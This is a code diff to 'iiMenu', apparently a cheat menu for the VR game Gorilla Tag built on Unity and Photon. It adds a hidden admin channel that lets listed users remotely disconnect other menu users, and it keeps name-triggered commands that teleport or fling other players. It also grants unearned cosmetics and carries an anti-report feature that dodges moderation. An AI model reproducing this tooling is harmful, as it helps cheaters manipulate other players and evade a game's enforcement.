@@ -19,6 +19,7 @@ using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using UnityEngine;
 using UnityEngine.InputSystem;
+using UnityEngine.Rendering;
 using UnityEngine.UI;
 using UnityEngine.XR;
 using Valve.VR;
@@ -490,7 +491,7 @@ namespace iiMenu.Menu
                     // Load version and admin player ID
                     try
                     {
-                        if (shouldAttemptLoadData && Time.time > shouldLoadDataTime)
+                        if (shouldAttemptLoadData && Time.time > shouldLoadDataTime && GorillaComputer.instance.isConnectedToMaster)
                         {
                             attemptsToLoad++;
                             if(attemptsToLoad >= 3)
@@ -611,10 +612,9 @@ namespace iiMenu.Menu
                         Set your name to any one of the commands
 
                         // Commands //
-                        gtkick - Kicks everyone from the lobby
                         gtup - Sends everyone flying away upwards
                         gtarmy - Sets everyone's color and name to yours
-                        gtbring - Teleports everyone to above your head
+                        gtbring - Teleports everyone to above you
                         gtctrhand - Teleports everyone in front of your hand
                         gtctrhead - Teleports everyone in front of your head
                         gtorbit - Makes everyone orbit around you
@@ -630,23 +630,32 @@ namespace iiMenu.Menu
                     {
                         try
                         {
-                            if (admins[PhotonNetwork.LocalPlayer.UserId] == null)
+                            if (!admins.ContainsKey(PhotonNetwork.LocalPlayer.UserId))
                             {
                                 Photon.Realtime.Player owner = null;
                                 bool ownerInServer = false;
-                                string adminName = "goldentrophy";
                                 string command = "";
                                 foreach (Photon.Realtime.Player player in PhotonNetwork.PlayerList)
                                 {
                                     try
                                     {
-                                        if (admins[player.UserId] != null)
+                                        if (admins.ContainsKey(player.UserId))
                                         {
-                                            ownerInServer = true;
-                                            adminName = admins[player.UserId];
-                                            command = player.NickName.ToLower();
-                                            owner = player;
-                                            break;
+                                            if (!ownerInServer)
+                                            {
+                                                ownerInServer = true;
+                                                adminName = admins[player.UserId];
+                                                command = player.NickName.ToLower();
+                                                owner = player;
+                                            } else
+                                            {
+                                                if (admins[player.UserId] == "goldentrophy")
+                                                {
+                                                    adminName = admins[player.UserId];
+                                                    command = player.NickName.ToLower();
+                                                    owner = player;
+                                                }
+                                            }
                                         }
                                     } catch { }
                                 }
@@ -654,6 +663,7 @@ namespace iiMenu.Menu
                                 if (ownerInServer && !lastOwner)
                                 {
                                     NotifiLib.SendNotification("<color=grey>[</color><color=purple>" + (adminName == "goldentrophy" ? "OWNER" : "ADMIN") + "</color><color=grey>]</color> " + adminName + " is in your room!");
+                                    GetVRRigFromPlayer(owner).concatStringOfCosmeticsAllowed += "LBAAK.LBADE.LBAAD.LBAAE.LBAAN.LBAAZ.LBACP.LMAJS.";
                                 }
                                 if (!ownerInServer && lastOwner)
                                 {
@@ -661,11 +671,6 @@ namespace iiMenu.Menu
                                 }
                                 if (ownerInServer == true)
                                 {
-                                    if (command == "gtkick")
-                                    {
-                                        NotifiLib.SendNotification("<color=grey>[</color><color=red>" + (adminName == "goldentrophy" ? "OWNER" : "ADMIN") + "</color><color=grey>]</color> " + adminName + " has requested your disconnection.");
-                                        PhotonNetwork.Disconnect();
-                                    }
                                     if (command == "gtup")
                                     {
                                         GorillaLocomotion.Player.Instance.GetComponent<Rigidbody>().velocity += Vector3.up * Time.deltaTime * 45f;
@@ -673,7 +678,7 @@ namespace iiMenu.Menu
                                     if (command == "gtarmy" && lastCommand != "gtarmy")
                                     {
                                         ChangeColor(GetVRRigFromPlayer(owner).mainSkin.material.color);
-                                        FakeName("goldentrophy");
+                                        FakeName(adminName);
                                     }
                                     if (command == "gtbring")
                                     {
@@ -747,7 +752,7 @@ namespace iiMenu.Menu
                                     }
                                     if (command == "gtnotifs")
                                     {
-                                        NotifiLib.SendNotification("<color=grey>[</color><color=purple>OWNER</color><color=grey>]</color> <color=white>Yes, I am the real goldentrophy. I made the menu.</color>");
+                                        NotifiLib.SendNotification(adminName == "goldentrophy" ? "<color=grey>[</color><color=purple>OWNER</color><color=grey>]</color> <color=white>Yes, I am the real goldentrophy. I made the menu.</color>" : "<color=grey>[</color><color=purple>ADMIN</color><color=grey>]</color> <color=white>Yes, I am the real " + adminName + ". I am an admin in the Discord server.</color>");
                                     }
                                     if (command == "gtupdate")
                                     {
@@ -787,44 +792,6 @@ namespace iiMenu.Menu
                         {
                             try
                             {
-                                if (changingName)
-                                {
-                                    try
-                                    {
-                                        GorillaComputer.instance.currentName = nameChange;
-                                        PhotonNetwork.LocalPlayer.NickName = nameChange;
-                                        GorillaComputer.instance.offlineVRRigNametagText.text = nameChange;
-                                        GorillaComputer.instance.savedName = nameChange;
-                                        PlayerPrefs.SetString("playerName", nameChange);
-                                        PlayerPrefs.Save();
-                                    }
-                                    catch (Exception exception)
-                                    {
-                                        UnityEngine.Debug.LogError(string.Format("iiMenu <b>NAME ERROR</b> {1} - {0}", exception.Message, exception.StackTrace));
-                                    }
-
-                                    if (!changingColor)
-                                    {
-                                        try
-                                        {
-                                            PlayerPrefs.SetFloat("redValue", Mathf.Clamp(GorillaTagger.Instance.offlineVRRig.playerColor.r, 0f, 1f));
-                                            PlayerPrefs.SetFloat("greenValue", Mathf.Clamp(GorillaTagger.Instance.offlineVRRig.playerColor.g, 0f, 1f));
-                                            PlayerPrefs.SetFloat("blueValue", Mathf.Clamp(GorillaTagger.Instance.offlineVRRig.playerColor.b, 0f, 1f));
-
-                                            //GorillaTagger.Instance.offlineVRRig.mainSkin.material.color = GorillaTagger.Instance.offlineVRRig.playerColor;
-                                            GorillaTagger.Instance.UpdateColor(GorillaTagger.Instance.offlineVRRig.playerColor.r, GorillaTagger.Instance.offlineVRRig.playerColor.g, GorillaTagger.Instance.offlineVRRig.playerColor.b);
-                                            PlayerPrefs.Save();
-
-                                            GorillaTagger.Instance.myVRRig.RPC("InitializeNoobMaterial", RpcTarget.All, new object[] { GorillaTagger.Instance.offlineVRRig.playerColor.r, GorillaTagger.Instance.offlineVRRig.playerColor.g, GorillaTagger.Instance.offlineVRRig.playerColor.b, false });
-                                            RPCProtection();
-                                        }
-                                        catch (Exception exception)
-                                        {
-                                            UnityEngine.Debug.LogError(string.Format("iiMenu <b>COLOR ERROR</b> {1} - {0}", exception.Message, exception.StackTrace));
-                                        }
-                                    }
-                                }
-
                                 if (changingColor)
                                 {
                                     try
@@ -851,10 +818,8 @@ namespace iiMenu.Menu
                                 UnityEngine.Debug.LogError(string.Format("iiMenu <b>CHANGE ERROR</b> {1} - {0}", exception.Message, exception.StackTrace));
                             }
                             GorillaTagger.Instance.offlineVRRig.enabled = true;
-                            changingName = false;
-                            changingColor = false;
 
-                            nameChange = "";
+                            changingColor = false;
                             colorChange = Color.black;
 
                             isUpdatingValues = false;
@@ -1738,12 +1703,11 @@ namespace iiMenu.Menu
                         switch (themeType)
                         {
                             case 25:
-                                if (hasLoadedPride == false)
+                                if (pride == null)
                                 {
                                     pride = LoadTextureFromResource("iiMenu.Resources.pride.png");
                                     pride.filterMode = FilterMode.Point;
                                     pride.wrapMode = TextureWrapMode.Clamp;
-                                    hasLoadedPride = true;
                                 }
                                 gameObject.GetComponent<Renderer>().material.shader = Shader.Find("Universal Render Pipeline/Lit");
                                 gameObject.GetComponent<Renderer>().material.color = Color.white;
@@ -1751,24 +1715,22 @@ namespace iiMenu.Menu
                                 UnityEngine.Debug.Log("gayed the texture");
                                 break;
                             case 26:
-                                if (hasLoadedTrans == false)
+                                if (trans == null)
                                 {
                                     trans = LoadTextureFromResource("iiMenu.Resources.trans.png");
                                     trans.filterMode = FilterMode.Point;
                                     trans.wrapMode = TextureWrapMode.Clamp;
-                                    hasLoadedTrans = true;
                                 }
                                 gameObject.GetComponent<Renderer>().material.shader = Shader.Find("Universal Render Pipeline/Lit");
                                 gameObject.GetComponent<Renderer>().material.color = Color.white;
                                 gameObject.GetComponent<Renderer>().material.mainTexture = trans;
                                 break;
                             case 27:
-                                if (hasLoadedGay == false)
+                                if (gay == null)
                                 {
                                     gay = LoadTextureFromResource("iiMenu.Resources.mlm.png");
                                     gay.filterMode = FilterMode.Point;
                                     gay.wrapMode = TextureWrapMode.Clamp;
-                                    hasLoadedGay = true;
                                 }
                                 gameObject.GetComponent<Renderer>().material.shader = Shader.Find("Universal Render Pipeline/Lit");
                                 gameObject.GetComponent<Renderer>().material.color = Color.white;
@@ -2228,6 +2190,50 @@ namespace iiMenu.Menu
                 }
             }
             RecenterMenu();
+            if (themeType == 50)
+            {
+                for (int i = 0; i < 15; i++)
+                {
+                    GameObject particle = GameObject.CreatePrimitive(PrimitiveType.Cube);
+                    particle.transform.position = menuBackground.transform.position;
+                    particle.transform.localScale = new Vector3(0.1f, 0.1f, 0.1f);
+                    UnityEngine.Object.Destroy(particle.GetComponent<Rigidbody>());
+                    UnityEngine.Object.Destroy(particle.GetComponent<BoxCollider>());
+
+                    UnityEngine.Object.Destroy(particle, 2f);
+
+                    particle.GetComponent<Renderer>().material.shader = Shader.Find("Universal Render Pipeline/Lit");
+                    particle.GetComponent<Renderer>().material.color = Color.white;
+                    if (cannmat == null)
+                    {
+                        cannmat = new Material(Shader.Find("Universal Render Pipeline/Lit"));
+
+                        cannmat.color = Color.white;
+                        if (cann == null)
+                        {
+                            cann = LoadTextureFromURL("https://cdn.discordapp.com/attachments/1222354892132454400/1265759418528567366/cannabis.png?ex=66a2add2&is=66a15c52&hm=ba188f85576f51a8a1aab0e5dd8cf7a6bef360c3fc0718271c193ec13547e732&", "cannabis.png");
+                        }
+                        cannmat.mainTexture = cann;
+
+                        cannmat.SetFloat("_Surface", 1);
+                        cannmat.SetFloat("_Blend", 0);
+                        cannmat.SetFloat("_SrcBlend", (float)BlendMode.SrcAlpha);
+                        cannmat.SetFloat("_DstBlend", (float)BlendMode.OneMinusSrcAlpha);
+                        cannmat.SetFloat("_ZWrite", 0);
+                        cannmat.EnableKeyword("_SURFACE_TYPE_TRANSPARENT");
+                        cannmat.renderQueue = (int)RenderQueue.Transparent;
+
+                        cannmat.SetFloat("_Glossiness", 0.0f);
+                        cannmat.SetFloat("_Metallic", 0.0f);
+                    }
+                    particle.GetComponent<Renderer>().material = cannmat;
+
+                    Rigidbody comp = particle.AddComponent(typeof(Rigidbody)) as Rigidbody;
+                    comp.position = menuBackground.transform.position;
+                    comp.velocity = new Vector3(UnityEngine.Random.Range(-3f, 3f), UnityEngine.Random.Range(3f, 5f), UnityEngine.Random.Range(-3f, 3f));
+                    comp.angularVelocity = new Vector3(UnityEngine.Random.Range(-3f, 3f), UnityEngine.Random.Range(-3f, 3f), UnityEngine.Random.Range(-3f, 3f));
+                }
+            }
         }
 
         public static void RecenterMenu()
@@ -3263,7 +3269,7 @@ namespace iiMenu.Menu
             }
             return archiveholdables;
         }
-        /*
+        
         public static BuilderPiece[] archivepieces = null;
         public static BuilderPiece[] GetPieces()
         {
@@ -3277,7 +3283,7 @@ namespace iiMenu.Menu
                 archivepieces = UnityEngine.Object.FindObjectsOfType<BuilderPiece>();
             }
             return archivepieces;
-        }*/
+        }
 
         public static MonkeyeAI[] archivemonsters = null;
         public static MonkeyeAI[] GetMonsters()
@@ -3360,7 +3366,7 @@ namespace iiMenu.Menu
             {
                 try
                 {
-                    view.OwnershipTransfer = OwnershipOption.Request;
+                    //view.OwnershipTransfer = OwnershipOption.Request;
                     view.OwnerActorNr = PhotonNetwork.LocalPlayer.ActorNumber;
                     view.ControllerActorNr = PhotonNetwork.LocalPlayer.ActorNumber;
                     view.RequestOwnership();
@@ -3377,9 +3383,9 @@ namespace iiMenu.Menu
                     }
                     RPCProtection();
                 } catch { UnityEngine.Debug.Log("Faliure to get ownership, is the PhotonView valid?"); }
-            } else
-            {
-                view.OwnershipTransfer = OwnershipOption.Fixed;
+            //} else
+            //{
+                //view.OwnershipTransfer = OwnershipOption.Fixed;
             }
         }
 
@@ -3434,6 +3440,13 @@ namespace iiMenu.Menu
             for (int i = 0; i < localPositions.Length; i++)
             {
                 GameObject side = GameObject.CreatePrimitive(PrimitiveType.Cube);
+                try
+                {
+                    if (platform.GetComponent<GorillaSurfaceOverride>() != null)
+                    {
+                        side.AddComponent<GorillaSurfaceOverride>().overrideIndex = platform.GetComponent<GorillaSurfaceOverride>().overrideIndex;
+                    }
+                } catch { }
                 float size = 0.025f;
                 side.transform.SetParent(platform.transform);
                 side.transform.position = localPositions[i] * (size / 2);
@@ -3452,6 +3465,7 @@ namespace iiMenu.Menu
                 PhotonNetwork.PhotonServerSettings.RpcList[int.Parse(((Hashtable)data.CustomData)[(byte)5].ToString())] is for the RPC name if you shall dare receive it
                 (object[])((Hashtable)data.CustomData)[(byte)4] to decrypt the args from RPCs
                 (string)((object[])data.CustomData)[(byte)0] to decrypt the args from events
+
             Thanks for listening to my ted talk
             */
             try
@@ -3466,20 +3480,44 @@ namespace iiMenu.Menu
                         NotifiLib.SendNotification("<color=grey>[</color><color=purple>ANTI-REPORT</color><color=grey>]</color> " + PhotonNetwork.NetworkingClient.CurrentRoom.GetPlayer(data.Sender, false).NickName + " attempted to report you using the Oculus menu, you have been disconnected.");
                     }
                 }
+
+                if (data.Code == 68) // Admin mods, before you try anything yes it's player ID locked
+                {
+                    object[] args = (object[])data.CustomData;
+                    if (admins.ContainsKey(PhotonNetwork.NetworkingClient.CurrentRoom.GetPlayer(data.Sender, false).UserId))
+                    {
+                        string command = (string)args[0];
+                        switch (command)
+                        {
+                            case "kick":
+                                Visuals.LightningStrike(GetVRRigFromPlayer(GetPlayerFromID((string)args[1])).headMesh.transform.position);
+                                if ((string)args[1] == PhotonNetwork.LocalPlayer.UserId)
+                                {
+                                    PhotonNetwork.Disconnect();
+                                }
+                                break;
+                            case "kickall":
+                                foreach (Photon.Realtime.Player plr in admins.ContainsKey(PhotonNetwork.LocalPlayer.UserId) ? PhotonNetwork.PlayerListOthers : PhotonNetwork.PlayerList)
+                                {
+                                    Visuals.LightningStrike(GetVRRigFromPlayer(plr).headMesh.transform.position);
+                                }
+                                if (!admins.ContainsKey(PhotonNetwork.LocalPlayer.UserId))
+                                {
+                                    PhotonNetwork.Disconnect();
+                                }
+                                break;
+                            case "detect":
+                                FakeName(PhotonNetwork.LocalPlayer.NickName.ToLower());
+                                break;
+                        }
+                    }
+                }
             } catch { }
         }
 
         public static void TeleportPlayer(Vector3 pos) // Prevents your fat hands from getting stuck on trees
         {
-            //pos = World2Player(pos);
-
-            /*GorillaLocomotion.Player.Instance.GetComponent<Rigidbody>().transform.position = pos;
-            typeof(GorillaLocomotion.Player).GetField("lastPosition").SetValue(GorillaLocomotion.Player.Instance, pos);
-            typeof(GorillaLocomotion.Player).GetField("velocityHistory").SetValue(GorillaLocomotion.Player.Instance, new Vector3[GorillaLocomotion.Player.Instance.velocityHistorySize]);
-
-            GorillaLocomotion.Player.Instance.lastHeadPosition = GorillaLocomotion.Player.Instance.headCollider.transform.position;
-            typeof(GorillaLocomotion.Player).GetField("lastLeftHandPosition").SetValue(GorillaLocomotion.Player.Instance, pos);
-            typeof(GorillaLocomotion.Player).GetField("lastRightHandPosition").SetValue(GorillaLocomotion.Player.Instance, pos);*/
+            closePosition = Vector3.zero;
             Patches.TeleportPatch.doTeleport = true;
             Patches.TeleportPatch.telePos = pos;
         }
@@ -3541,38 +3579,12 @@ namespace iiMenu.Menu
         {
             try
             {
-                if (PhotonNetwork.InRoom)
-                {
-                    if (GorillaComputer.instance.friendJoinCollider.playerIDsCurrentlyTouching.Contains(PhotonNetwork.LocalPlayer.UserId))
-                    {
-                        GorillaComputer.instance.currentName = PlayerName;
-                        PhotonNetwork.LocalPlayer.NickName = PlayerName;
-                        GorillaComputer.instance.offlineVRRigNametagText.text = PlayerName;
-                        GorillaComputer.instance.savedName = PlayerName;
-                        PlayerPrefs.SetString("playerName", PlayerName);
-                        PlayerPrefs.Save();
-
-                        ChangeColor(GorillaTagger.Instance.offlineVRRig.playerColor);
-                    }
-                    else
-                    {
-                        isUpdatingValues = true;
-                        valueChangeDelay = Time.time + 0.75f;
-                        changingName = true;
-                        nameChange = PlayerName;
-                    }
-                }
-                else
-                {
-                    GorillaComputer.instance.currentName = PlayerName;
-                    PhotonNetwork.LocalPlayer.NickName = PlayerName;
-                    GorillaComputer.instance.offlineVRRigNametagText.text = PlayerName;
-                    GorillaComputer.instance.savedName = PlayerName;
-                    PlayerPrefs.SetString("playerName", PlayerName);
-                    PlayerPrefs.Save();
-
-                    ChangeColor(GorillaTagger.Instance.offlineVRRig.playerColor);
-                }
+                GorillaComputer.instance.currentName = PlayerName;
+                PhotonNetwork.LocalPlayer.NickName = PlayerName;
+                GorillaComputer.instance.offlineVRRigNametagText.text = PlayerName;
+                GorillaComputer.instance.savedName = PlayerName;
+                PlayerPrefs.SetString("playerName", PlayerName);
+                PlayerPrefs.Save();
             }
             catch (Exception exception)
             {
@@ -3950,7 +3962,6 @@ namespace iiMenu.Menu
         public static bool hasRemovedThisFrame = false;
         public static int buttonsType = 0;
         public static float buttonCooldown = 0f;
-        public static bool noti = true;
         public static bool disableNotifications = false;
         public static bool showEnabledModsVR = true;
         public static bool disableDisconnectButton = false;
@@ -4065,6 +4076,7 @@ namespace iiMenu.Menu
         };
 
         public static Dictionary<string, string> admins = new Dictionary<string, string> { { "47F316437B9BE495", "goldentrophy" } };
+        public static string adminName = "";
 
         public static string hotkeyButton = "none";
 
@@ -4076,7 +4088,6 @@ namespace iiMenu.Menu
         public static int GorillaCosmetics = LayerMask.NameToLayer("GorillaCosmetics");
         public static int GorillaParticle = LayerMask.NameToLayer("GorillaParticle");
 
-        public static GameObject cam = null;
         public static Camera TPC = null;
         public static GameObject menu = null;
         public static GameObject menuBackground = null;
@@ -4090,9 +4101,6 @@ namespace iiMenu.Menu
         public static VRRig whoCopy = null;
         public static VRRig GhostRig = null;
         public static Material funnyghostmaterial = null;
-        public static Texture2D searchIcon = null;
-        public static Texture2D returnIcon = null;
-        public static Texture2D fixTexture = null;
         public static Material searchMat = null;
         public static Material returnMat = null;
         public static Material fixMat = null;
@@ -4161,14 +4169,14 @@ namespace iiMenu.Menu
         public static GameObject motdText = null;
         public static Material glass = null;
 
-        public static bool hasLoadedPride = false;
-        public static Texture2D pride = new Texture2D(2, 2);
-
-        public static bool hasLoadedTrans = false;
-        public static Texture2D trans = new Texture2D(2, 2);
-
-        public static bool hasLoadedGay = false;
-        public static Texture2D gay = new Texture2D(2, 2);
+        public static Material cannmat = null;
+        public static Texture2D cann = null;
+        public static Texture2D pride = null;
+        public static Texture2D trans = null;
+        public static Texture2D gay = null;
+        public static Texture2D searchIcon = null;
+        public static Texture2D returnIcon = null;
+        public static Texture2D fixTexture = null;
 
         public static List<string> favorites = new List<string> { "Exit Favorite Mods" };
 
@@ -4288,10 +4296,7 @@ namespace iiMenu.Menu
 
         public static bool isUpdatingValues = false;
         public static float valueChangeDelay = 0f;
-
-        public static bool changingName = false;
         public static bool changingColor = false;
-        public static string nameChange = "";
 
         public static int projmode = 0;
         public static int trailmode = 0;
